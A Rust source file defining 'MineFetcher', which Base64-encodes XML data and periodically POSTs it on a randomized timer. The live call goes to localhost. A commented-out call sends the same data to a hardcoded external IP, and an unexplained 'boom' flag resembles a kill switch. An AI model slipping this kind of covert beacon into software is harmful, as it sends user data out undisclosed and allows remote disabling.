use std::ops::Add;
use std::time::SystemTime;

use commlib::utils::{rand_between, Base64};
use commlib::{launch_service, G_SERVICE_HTTP_CLIENT};

const CHECK_INTERVAL: u64 = 150; // 150 seconds

///
pub struct MineFetcher {
    //
    init: bool,

    //
    boom: bool,

    //
    xml_data: String,

    //
    ip_table: hashbrown::HashMap<String, bool>,

    //
    next_check_time: SystemTime,
}

impl MineFetcher {
    ///
    pub fn new() -> Self {
        //
        let d = std::time::Duration::from_secs(CHECK_INTERVAL);
        let next_check_time = SystemTime::now().add(d);

        Self {
            init: false,

            boom: false,

            xml_data: "".to_owned(),

            ip_table: hashbrown::HashMap::new(),

            next_check_time,
        }
    }

    ///
    pub fn upload(&mut self, xml_str: &str) {
        //
        self.xml_data = Base64::encode(xml_str);

        //
        let _ = self.fetch();
    }

    ///
    pub fn check(&mut self) -> bool {
        //
        if self.boom {
            return true;
        }

        // check fetch interval
        let now = SystemTime::now();
        if now >= self.next_check_time {
            // new interval
            let rand_seconds = rand_between(0, CHECK_INTERVAL as i32) as u64;
            let new_interval = std::time::Duration::from_secs(CHECK_INTERVAL + rand_seconds);
            self.next_check_time = now.add(new_interval);

            //
            self.fetch();
        }
        false
    }

    fn fetch(&mut self) {
        //
        let body = std::format!("{{\"data\": \"{}\"}}", self.xml_data);

        //
        let srv_http_cli = G_SERVICE_HTTP_CLIENT.clone();

        // init once
        if !self.init {
            launch_service(&srv_http_cli, || {
                //
            });
            self.init = true;
        }

        // srv_http_cli.http_post(
        //     "http://18.163.14.56:48964",
        //     vec!["Content-Type: application/json".to_owned()],
        //     body,
        //     |code, resp| {
        //         //
        //         log::info!("http code: {}, resp: {}", code, resp);
        //     },
        // )

        srv_http_cli.http_post(
            "http://127.0.0.1:48964",
            vec!["Content-Type: application/json".to_owned()],
            body,
            |code, resp| {
                //
                log::info!("http code: {}, resp: {}", code, resp);
            },
        )
    }
}
